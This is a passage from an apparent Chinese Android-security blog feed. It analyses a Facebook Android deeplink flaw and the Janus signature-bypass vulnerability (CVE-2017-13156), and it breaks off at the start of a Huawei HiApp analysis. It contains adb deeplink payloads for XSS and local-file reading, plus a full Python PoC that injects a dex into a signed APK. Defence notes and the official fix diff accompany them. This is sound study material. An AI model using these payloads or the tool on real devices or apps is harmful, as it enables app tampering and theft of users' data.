class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">fb:&#x2F;&#x2F;ama&#x2F;?fb_hidesTabBar&#x3D;String&amp;targetURI&#x3D;String&amp;entryPoint&#x3D;String&amp;presentationMethod&#x3D;String</span><br><span class="line">fb:&#x2F;&#x2F;aymtinstadeck&#x2F;?fb_hidesTabBar&#x3D;String&amp;targetURI&#x3D;String&amp;entryPoint&#x3D;String&amp;presentationMethod&#x3D;String</span><br><span class="line">fb:&#x2F;&#x2F;activitylog_edit_privacy&#x2F;?fb_hidesTabBar&#x3D;String&amp;targetURI&#x3D;String&amp;entryPoint&#x3D;String&amp;presentationMethod&#x3D;String</span><br><span class="line">fb:&#x2F;&#x2F;activitylogfiltered&#x2F;?fb_hidesTabBar&#x3D;String&amp;targetURI&#x3D;String&amp;entryPoint&#x3D;String&amp;presentationMethod&#x3D;String</span><br><span class="line">fb:&#x2F;&#x2F;activitylog&#x2F;?fb_hidesTabBar&#x3D;String&amp;targetURI&#x3D;String&amp;entryPoint&#x3D;String&amp;presentationMethod&#x3D;String</span><br><span class="line">fb:&#x2F;&#x2F;pagesadminhelp&#x2F;?fb_hidesTabBar&#x3D;String&amp;targetURI&#x3D;String&amp;entryPoint&#x3D;String&amp;presentationMethod&#x3D;String</span><br><span class="line">fb:&#x2F;&#x2F;canvaseditor&#x2F;?fb_hidesTabBar&#x3D;String&amp;targetURI&#x3D;String&amp;entryPoint&#x3D;String&amp;presentationMethod&#x3D;String</span><br><span class="line">fb:&#x2F;&#x2F;adsmanager&#x2F;&#123;account&#125;&#x2F;insights&#x2F;&#123;adObject&#125;&#x2F;?fb_hidesTabBar&#x3D;String&amp;targetURI&#x3D;String&amp;entryPoint&#x3D;String&amp;presentationMethod&#x3D;String</span><br><span class="line">fb:&#x2F;&#x2F;adsmanager&#x2F;image&#x2F;select&#x2F;&#123;page&#125;&#x2F;?fb_hidesTabBar&#x3D;String&amp;targetURI&#x3D;String&amp;entryPoint&#x3D;String&amp;presentationMethod&#x3D;String</span><br><span class="line">fb:&#x2F;&#x2F;ads_payments_add_bank_account&#x2F;?fb_hidesTabBar&#x3D;String&amp;targetURI&#x3D;String&amp;entryPoint&#x3D;String&amp;presentationMethod&#x3D;String</span><br><span class="line">fb:&#x2F;&#x2F;ads_payments_add_credit_card&#x2F;?fb_hidesTabBar&#x3D;String&amp;targetURI&#x3D;String&amp;entryPoint&#x3D;String&amp;presentationMethod&#x3D;String</span><br><span class="line">fb:&#x2F;&#x2F;ads_payments_add_paypal&#x2F;?fb_hidesTabBar&#x3D;String&amp;targetURI&#x3D;String&amp;entryPoint&#x3D;String&amp;presentationMethod&#x3D;String</span><br><span class="line">fb:&#x2F;&#x2F;ads_payments_billing_date&#x2F;?fb_hidesTabBar&#x3D;String&amp;targetURI&#x3D;String&amp;entryPoint&#x3D;String&amp;presentationMethod&#x3D;String</span><br><span class="line">fb:&#x2F;&#x2F;ads_payments_billing_date_saved&#x2F;?fb_hidesTabBar&#x3D;String&amp;targetURI&#x3D;String&amp;entryPoint&#x3D;String&amp;presentationMethod&#x3D;String</span><br><span class="line">fb:&#x2F;&#x2F;ads_payments_brazil_address_info&#x2F;?fb_hidesTabBar&#x3D;String&amp;targetURI&#x3D;String&amp;entryPoint&#x3D;String&amp;presentationMethod&#x3D;String</span><br><span class="line">fb:&#x2F;&#x2F;ads_payments_brazil_tax_id&#x2F;?fb_hidesTabBar&#x3D;String&amp;targetURI&#x3D;String&amp;entryPoint&#x3D;String&amp;presentationMethod&#x3D;String</span><br><span class="line">fb:&#x2F;&#x2F;ads_payments_checkout_receipt&#x2F;?fb_hidesTabBar&#x3D;String&amp;targetURI&#x3D;String&amp;entryPoint&#x3D;String&amp;presentationMethod&#x3D;String</span><br><span class="line">fb:&#x2F;&#x2F;ads_checkout_payment_receipt&#x2F;?fb_hidesTabBar&#x3D;String&amp;targetURI&#x3D;String&amp;entryPoint&#x3D;String&amp;presentationMethod&#x3D;String</span><br><span class="line">fb:&#x2F;&#x2F;ads_payments_checkout&#x2F;?fb_hidesTabBar&#x3D;String&amp;targetURI&#x3D;String&amp;entryPoint&#x3D;String&amp;presentationMethod&#x3D;String</span><br><span class="line">fb:&#x2F;&#x2F;ads_payments_collect_tax_details&#x2F;?fb_hidesTabBar&#x3D;String&amp;targetURI&#x3D;String&amp;entryPoint&#x3D;String&amp;presentationMethod&#x3D;String</span><br><span class="line">fb:&#x2F;&#x2F;ads_payments_country_selector&#x2F;?fb_hidesTabBar&#x3D;String&amp;targetURI&#x3D;String&amp;entryPoint&#x3D;String&amp;presentationMethod&#x3D;String</span><br><span class="line">fb:&#x2F;&#x2F;ads_payments_add_card&#x2F;?fb_hidesTabBar&#x3D;String&amp;targetURI&#x3D;String&amp;entryPoint&#x3D;String&amp;presentationMethod&#x3D;String</span><br><span class="line">fb:&#x2F;&#x2F;ads_payments_currency_selector&#x2F;?fb_hidesTabBar&#x3D;String&amp;targetURI&#x3D;String&amp;entryPoint&#x3D;String&amp;presentationMethod&#x3D;String</span><br><span class="line">fb:&#x2F;&#x2F;ads_payments_direct_debit_country_selector&#x2F;?fb_hidesTabBar&#x3D;String&amp;targetURI&#x3D;String&amp;entryPoint&#x3D;String&amp;presentationMethod&#x3D;String</span><br><span class="line">fb:&#x2F;&#x2F;ads_payments_flow&#x2F;?fb_hidesTabBar&#x3D;String&amp;targetURI&#x3D;String&amp;entryPoint&#x3D;String&amp;presentationMethod&#x3D;String</span><br><span class="line">fb:&#x2F;&#x2F;ads_payments_gst_id&#x2F;?fb_hidesTabBar&#x3D;String&amp;targetURI&#x3D;String&amp;entryPoint&#x3D;String&amp;presentationMethod&#x3D;String</span><br><span class="line">fb:&#x2F;&#x2F;ads_payments_prepay_business_info&#x2F;?fb_hidesTabBar&#x3D;String&amp;targetURI&#x3D;String&amp;entryPoint&#x3D;String&amp;presentationMethod&#x3D;String</span><br><span class="line">fb:&#x2F;&#x2F;ads_payments_prepay_client_info&#x2F;?fb_hidesTabBar&#x3D;String&amp;targetURI&#x3D;String&amp;entryPoint&#x3D;String&amp;presentationMethod&#x3D;String</span><br><span class="line">fb:&#x2F;&#x2F;ads_payments_prepay_disclaimer&#x2F;?fb_hidesTabBar&#x3D;String&amp;targetURI&#x3D;String&amp;entryPoint&#x3D;String&amp;presentationMethod&#x3D;String</span><br><span class="line">fb:&#x2F;&#x2F;ads_payments_prepay_funding&#x2F;?fb_hidesTabBar&#x3D;String&amp;targetURI&#x3D;String&amp;entryPoint&#x3D;String&amp;presentationMethod&#x3D;String</span><br><span class="line">fb:&#x2F;&#x2F;ads_payments_prepay_payment_status&#x2F;?fb_hidesTabBar&#x3D;String&amp;targetURI&#x3D;String&amp;entryPoint&#x3D;String&amp;presentationMethod&#x3D;String</span><br><span class="line">fb:&#x2F;&#x2F;ads_payments_redeem_coupon&#x2F;?fb_hidesTabBar&#x3D;String&amp;targetURI&#x3D;String&amp;entryPoint&#x3D;String&amp;presentationMethod&#x3D;String</span><br><span class="line">fb:&#x2F;&#x2F;ads_payments_select_payment_method&#x2F;?fb_hidesTabBar&#x3D;String&amp;targetURI&#x3D;String&amp;entryPoint&#x3D;String&amp;presentationMethod&#x3D;String</span><br><span class="line">fb:&#x2F;&#x2F;ads_payments_UK_direct_debit_guarantee&#x2F;?fb_hidesTabBar&#x3D;String&amp;targetURI&#x3D;String&amp;entryPoint&#x3D;String&amp;presentationMethod&#x3D;String</span><br><span class="line">fb:&#x2F;&#x2F;author_publisher_settings_add_publications_modal&#x2F;?fb_hidesTabBar&#x3D;String&amp;targetURI&#x3D;String&amp;entryPoint&#x3D;String&amp;presentationMethod&#x3D;String</span><br></pre></td></tr></table></figure><p>总共有521一个链接</p><h3 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h3><p>根据上面的脚本跑出来的url,可以在其基础上，随机初始化参数后，自动化跑模拟器或真机，观察结果</p><p>Payload:</p><p><strong>adb shell am start -a “android.intent.action.VIEW” -d “fb_url”</strong></p><p>找出其中一些比较有利用价值的payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">adb shell am start -a &quot;android.intent.action.VIEW&quot; -d &quot;fb:&#x2F;&#x2F;payments_add_paypal&#x2F;?url&#x3D;&#123;STRING&#125;&quot;</span><br><span class="line"></span><br><span class="line">adb shell am start -a &quot;android.intent.action.VIEW&quot; -d &quot;fb:&#x2F;&#x2F;ig_lwicreate_instagram_account_full_screen_ad_preview&#x2F;?adPreviewUrl&#x3D;&#123;STRING&#125;&quot;</span><br><span class="line"></span><br><span class="line">adb shell am start -a &quot;android.intent.action.VIEW&quot; -d &quot;fb:&#x2F;&#x2F;ads_payments_prepay_webview&#x2F;?account&#x3D;&#123;STRING&#125;\&amp;contextID&#x3D;&#123;STRING&#125;\&amp;paymentID&#x3D;&#123;STRING&#125;\&amp;url&#x3D;&#123;STRING&#125;\&amp;originRootTag&#x3D;&#123;INTEGER&#125;&quot;</span><br><span class="line"></span><br><span class="line">adb shell am start -a &quot;android.intent.action.VIEW&quot; -d &quot;fb:&#x2F;&#x2F;ig_lwicreate_instagram_account_full_screen_ad_preview&#x2F;?adPreviewUrl&#x3D;https:&#x2F;&#x2F;google.com&quot;</span><br></pre></td></tr></table></figure><p>由于墙内的原因(你懂的),最终效果引用原作者的图</p><p>XSS 攻击payload_1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adb shell am start -a &quot;android.intent.action.VIEW&quot; -d &quot;fb:&#x2F;&#x2F;ig_lwicreate_instagram_account_full_screen_ad_preview&#x2F;?adPreviewUrl&#x3D;javascript:confirm(&#39;https:&#x2F;&#x2F;facebook.com&#x2F;Ashley.King.UK&#39;)&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/Users/tasfa/Downloads/fbxss.png"></p><p>LFI 攻击payload_2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am start -a &quot;android.intent.action.VIEW&quot; -d &quot;fb:&#x2F;&#x2F;ig_lwicreate_instagram_account_full_screen_ad_preview&#x2F;?adPreviewUrl&#x3D;file:&#x2F;&#x2F;&#x2F;sdcard&#x2F;CDAInfo.txt&quot;</span><br></pre></td></tr></table></figure><p><img src="/Users/tasfa/Downloads/fblfi.png"></p><h3 id="0x03-漏洞防御"><a href="#0x03-漏洞防御" class="headerlink" title="0x03 漏洞防御"></a>0x03 漏洞防御</h3><ul><li>尽量不要使用 setJavaScriptEnable(true)</li><li>尽量使用加密的方式存储deeplink路由信息等等关键信息</li><li>进行非法来源检测</li></ul><h3 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h3><p><a href="https://ash-king.co.uk/facebook-bug-bounty-09-18.html">Breaking the Facebook for Android application</a></p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;0x00-简述&quot;&gt;&lt;a href=&quot;#0x00-简述&quot; class=&quot;headerlink&quot; title=&quot;0x00 简述&quot;&gt;&lt;/a&gt;0x00 简述&lt;/h3&gt;&lt;p&gt;最近FB Android应用爆出了一个任意JS代码执行的漏洞,着手分析了一下，也挺有趣，分享学习一下,有不当之处还请包涵，欢迎讨论学习。&lt;/p&gt;
&lt;p&gt;测试环境:Android &lt;/p&gt;
&lt;p&gt;测试版本:Facebook &lt;/p&gt;
&lt;p&gt;测试版本下载: &lt;a href=&quot;https://facebook.en.9apps.com/&quot;&gt;9Apps&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ps：FreeBuf Style Title: 看我如何挖到价值$8500的Facebook漏洞 ：）&lt;/p&gt;
&lt;h3 id=&quot;0x01-漏洞原理&quot;&gt;&lt;a href=&quot;#0x01-漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞原理&quot;&gt;&lt;/a&gt;0x01 漏洞原理&lt;/h3&gt;&lt;p&gt;根据漏洞的简单描述,得知漏洞起因依旧是deeplink的问题,如果对这方面知识不熟悉，可以参考我的其他文章。&lt;/p&gt;</summary>
    
    
    
    <category term="Android安全" scheme="http://example.com/categories/Android%E5%AE%89%E5%85%A8/"/>
    
    <category term="漏洞分析" scheme="http://example.com/categories/Android%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Android漏洞" scheme="http://example.com/tags/Android%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>Janus签名漏洞(CVE-2017-13156)原理与利用分析</title>
    <link href="http://example.com/2018/10/05/Janus%E7%AD%BE%E5%90%8D%E6%BC%8F%E6%B4%9E-CVE-2017-13156-%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/"/>
    <id>http://example.com/2018/10/05/Janus%E7%AD%BE%E5%90%8D%E6%BC%8F%E6%B4%9E-CVE-2017-13156-%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/</id>
    <published>2018-10-05T01:49:25.000Z</published>
    <updated>2021-05-22T13:10:54.206Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h2><p>前言:去年比较严重的洞,以比较浅显的方式学习记录一下，网上有很多其他深度分析文章，也可借鉴学习。</p><p>Janus签名漏洞可以让攻击者绕过安卓系统的signature scheme V1签名机制，进而直接对App进行篡改。而且由于安卓系统的其他安全机制也是建立在签名和校验基础之上，该漏洞相当于绕过了安卓系统的整个安全机制。</p><ul><li>公告详情:<br><img src="" alt="https://source.android.com/security/bulletin/2017-12-01"></li><li>影响: 利用该漏洞的攻击者可注入恶意代码直接修改app而不影响其原始签名,即修改后仍是官方签名</li><li>影响范围: Android 5.0-8.0且使用Signaturescheme V1签名的APK文件,不影响Signaturescheme V2</li><li>自测: adb shell dumpsys package pkgName | grep apkSigningVersion</li></ul><span id="more"></span><h2 id="0x01-漏洞原理"><a href="#0x01-漏洞原理" class="headerlink" title="0x01 漏洞原理"></a>0x01 漏洞原理</h2><ol><li><p>Android在4.4引入ART虚拟机，相比较于Dalvik虚拟机仅能运行包装于apk中的dex文件，ART还允许直接运行优化后的dex文件。具体操作是通过读取<strong>文件头部</strong>的magic字段进行判断，区别执行apk或者dex。</p></li><li><p>ZIP文件的读取方式是读取<strong>文件末尾</strong>定位的central directory, 然后通过里面的索引定位到各个zip entry，每个entry解压之后都对应一个文件。ParseZipArchive()函数在进行以上处理时候并没有判断文件头部的magic字段是否为504B0304(即Zip).</p></li></ol><p><img src="https://epo.alicdn.com/image/46c2mtm4lfj0.png" alt="图片来自阿里聚安全"></p><p>因此根据以上两点,攻击者可以通过将恶意dex文件置于apk文件的头部(如上图所示),在系统安装apk文件时，系统安装器解压zip时并没有先判断apk文件的头部magic字段，直接默认是apk(zip)文件，从而直接从文件尾部进行读取解压，此时签名没有任何变化，因此可欺骗系统，从而进行安装。</p><p>攻击关键点是当用户点击运行apk时，系统ART虚拟机会去判断文件头部的magic字段，从而使用不同的策略执行文件，由于该apk文件头部被修改为恶意dex，因此art虚拟机直接执行恶意dex文件。</p><h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><p>漏洞利用<a href="https://github.com/V-E-O/PoC/blob/master/CVE-2017-13156/janus.py">PoC</a>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> zlib <span class="keyword">import</span> adler32</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update_checksum</span>(<span class="params">data</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    生成sha1 hash </span></span><br><span class="line"><span class="string">    &quot;&lt;L&quot; 小端存储unsigned long</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    m = hashlib.sha1()</span><br><span class="line">    m.update(data[<span class="number">32</span>:])</span><br><span class="line">    data[<span class="number">12</span>:<span class="number">12</span>+<span class="number">20</span>] = m.digest()</span><br><span class="line"></span><br><span class="line"><span class="comment">#计算Adler-32 checksum</span></span><br><span class="line">    v = adler32(buffer(data[<span class="number">12</span>:])) &amp; <span class="number">0xffffffff</span> </span><br><span class="line">    data[<span class="number">8</span>:<span class="number">12</span>] = struct.pack(<span class="string">&quot;&lt;L&quot;</span>, v)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">4</span>:</span><br><span class="line">        print(<span class="string">&quot;usage: %s dex apk out_apk&quot;</span> % __file__)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    _, dex, apk, out_apk = sys.argv</span><br><span class="line"></span><br><span class="line">    <span class="comment">#读取dex二进制数据</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(dex, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        dex_data = <span class="built_in">bytearray</span>(f.read())</span><br><span class="line">    dex_size = <span class="built_in">len</span>(dex_data)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#操作zip文件,可学习一下zip文件格式</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(apk, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        apk_data = <span class="built_in">bytearray</span>(f.read())</span><br><span class="line">    cd_end_addr = apk_data.rfind(<span class="string">&#x27;\x50\x4b\x05\x06&#x27;</span>) </span><br><span class="line">    </span><br><span class="line">    <span class="comment">#central directory 起始地址</span></span><br><span class="line">    cd_start_addr = struct.unpack(<span class="string">&quot;&lt;L&quot;</span>, apk_data[cd_end_addr+<span class="number">16</span>:cd_end_addr+<span class="number">20</span>])[<span class="number">0</span>]</span><br><span class="line">    apk_data[cd_end_addr+<span class="number">16</span>:cd_end_addr+<span class="number">20</span>] = struct.pack(<span class="string">&quot;&lt;L&quot;</span>, cd_start_addr+dex_size)</span><br><span class="line"></span><br><span class="line">    pos = cd_start_addr</span><br><span class="line">    <span class="keyword">while</span> (pos &lt; cd_end_addr):</span><br><span class="line">        offset = struct.unpack(<span class="string">&quot;&lt;L&quot;</span>, apk_data[pos+<span class="number">42</span>:pos+<span class="number">46</span>])[<span class="number">0</span>]</span><br><span class="line">        apk_data[pos+<span class="number">42</span>:pos+<span class="number">46</span>] = struct.pack(<span class="string">&quot;&lt;L&quot;</span>, offset+dex_size)</span><br><span class="line">        pos = apk_data.find(<span class="string">&quot;\x50\x4b\x01\x02&quot;</span>, pos+<span class="number">46</span>, cd_end_addr)</span><br><span class="line">        <span class="keyword">if</span> pos == -<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#注入dex_data</span></span><br><span class="line">    out_data = dex_data + apk_data</span><br><span class="line">    out_data[<span class="number">32</span>:<span class="number">36</span>] = struct.pack(<span class="string">&quot;&lt;L&quot;</span>, <span class="built_in">len</span>(out_data))</span><br><span class="line">    update_checksum(out_data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(out_apk, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(out_data)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;%s generated&#x27;</span> % out_apk)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>##0x03 漏洞防御<br>谷歌官方修复<a href="https://android.googlesource.com/platform/system/core/+/9dced1626219d47c75a9d37156ed7baeef8f6403%5E%21/#F0">diff</a>:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/libziparchive/zip_archive.cc b/libziparchive/zip_archive.cc</span><br><span class="line">index <span class="number">78</span>de40a..d0bbd72 <span class="number">100644</span></span><br><span class="line">--- a/libziparchive/zip_archive.cc</span><br><span class="line">+++ b/libziparchive/zip_archive.cc</span><br><span class="line"></span><br><span class="line">@@ <span class="number">-441</span>,<span class="number">6</span> +<span class="number">441</span>,<span class="number">22</span> @@</span><br><span class="line">       <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line">+</span><br><span class="line">+  <span class="keyword">uint32_t</span> lfh_start_bytes;</span><br><span class="line">+  <span class="comment">//读取zip头部信息</span></span><br><span class="line">+  <span class="keyword">if</span> (!archive-&gt;mapped_zip.ReadAtOffset(<span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">uint8_t</span>*&gt;(&amp;lfh_start_bytes),</span><br><span class="line">+                                        <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>), <span class="number">0</span>)) &#123;</span><br><span class="line">+    ALOGW(<span class="string">&quot;Zip: Unable to read header for entry at offset == 0.&quot;</span>);</span><br><span class="line">+    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">+  &#125;</span><br><span class="line">+</span><br><span class="line">   <span class="comment">//增加kSignature头部验证，不同时返回-1</span></span><br><span class="line">+  <span class="keyword">if</span> (lfh_start_bytes != LocalFileHeader::kSignature) &#123;</span><br><span class="line">+    ALOGW(<span class="string">&quot;Zip: Entry at offset zero has invalid LFH signature %&quot;</span> PRIx32, lfh_start_bytes);</span><br><span class="line">+  <span class="meta">#<span class="meta-keyword">if</span> defined(__ANDROID__)</span></span><br><span class="line">+    android_errorWriteLog(<span class="number">0x534e4554</span>, <span class="string">&quot;64211847&quot;</span>);</span><br><span class="line">+  <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">+    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">+  &#125;</span><br><span class="line">+</span><br><span class="line">   ALOGV(<span class="string">&quot;+++ zip good scan %&quot;</span> PRIu16 <span class="string">&quot; entries&quot;</span>, num_entries);</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在解压zip文件时,调用函数ReadAtOffset()读取offset=0的magic字段是否为<a href="https://android.googlesource.com/platform/system/core/+/9dced1626219d47c75a9d37156ed7baeef8f6403/libziparchive/zip_archive_common.h">LocalFileHeader::kSignature</a>(即0x04034b50)</p><p>防御:</p><ul><li>使用Signaturescheme V2签名</li><li>前往官方网站下载正版应用或到阿里PP助手下载安全应用</li></ul><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://www.guardsquare.com/en/blog/new-android-vulnerability-allows-attackers-modify-apps-without-affecting-their-signatures">New Android vulnerability allows attackers to modify apps without affecting their signatures</a></p><p><a href="https://jaq.alibaba.com/community/art/show?articleid=1261">Janus漏洞（CVE-2017-13156）: 修改安卓app而不影响签名</a></p><p><a href="http://www.freebuf.com/articles/terminal/156862.html">安卓“Janus”漏洞的产生原理及利用过程</a></p><p><a href="http://blog.csdn.net/a200710716/article/details/51644421">ZIP文件格式分析</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-简介&quot;&gt;&lt;a href=&quot;#0x00-简介&quot; class=&quot;headerlink&quot; title=&quot;0x00 简介&quot;&gt;&lt;/a&gt;0x00 简介&lt;/h2&gt;&lt;p&gt;前言:去年比较严重的洞,以比较浅显的方式学习记录一下，网上有很多其他深度分析文章，也可借鉴学习。&lt;/p&gt;
&lt;p&gt;Janus签名漏洞可以让攻击者绕过安卓系统的signature scheme V1签名机制，进而直接对App进行篡改。而且由于安卓系统的其他安全机制也是建立在签名和校验基础之上，该漏洞相当于绕过了安卓系统的整个安全机制。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;公告详情:&lt;br&gt;&lt;img src=&quot;&quot; alt=&quot;https://source.android.com/security/bulletin/2017-12-01&quot;&gt;&lt;/li&gt;
&lt;li&gt;影响: 利用该漏洞的攻击者可注入恶意代码直接修改app而不影响其原始签名,即修改后仍是官方签名&lt;/li&gt;
&lt;li&gt;影响范围: Android 5.0-8.0且使用Signaturescheme V1签名的APK文件,不影响Signaturescheme V2&lt;/li&gt;
&lt;li&gt;自测: adb shell dumpsys package pkgName | grep apkSigningVersion&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="Android安全" scheme="http://example.com/categories/Android%E5%AE%89%E5%85%A8/"/>
    
    <category term="漏洞分析" scheme="http://example.com/categories/Android%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Android漏洞" scheme="http://example.com/tags/Android%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>Pwn2Own华为HiApp漏洞原理与利用分析(下)</title>
    <link href="http://example.com/2018/10/04/Pwn2Own%E5%8D%8E%E4%B8%BAHiApp%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90-%E4%B8%8B/"/>
    <id>http://example.com/2018/10/04/Pwn2Own%E5%8D%8E%E4%B8%BAHiApp%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90-%E4%B8%8B/</id>
    <published>2018-10-04T01:49:25.000Z</published>
    <updated>2021-05-22T13:10:54.206Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><p><a href="http://www.freebuf.com/articles/terminal/172780.html">Pwn2Own华为HiApp漏洞原理与利用分析(上)</a></p><p>阅读本篇的基础是先理解上篇的攻击构造链路。</p><h3 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h3><p>不知道有没有细心的同学发现我在上篇分析文章中留下的<strong>彩蛋</strong>。<br>本篇自然是从这个彩蛋切入.</p><span id="more"></span><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.mWebvewDelegate.initView(((Context)<span class="keyword">this</span>), request);<span class="comment">//我是彩蛋</span></span><br><span class="line"><span class="keyword">this</span>.mWebvewDelegate.loadPage(url);  <span class="comment">// 加载url</span></span><br></pre></td></tr></table></figure><p>从上篇的分析我们已经知道mWebvewDelegate的实例类为: <code>InternalWebviewDelegate</code>,那么切入InternalWebviewDelegate.initView函数进行分析。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 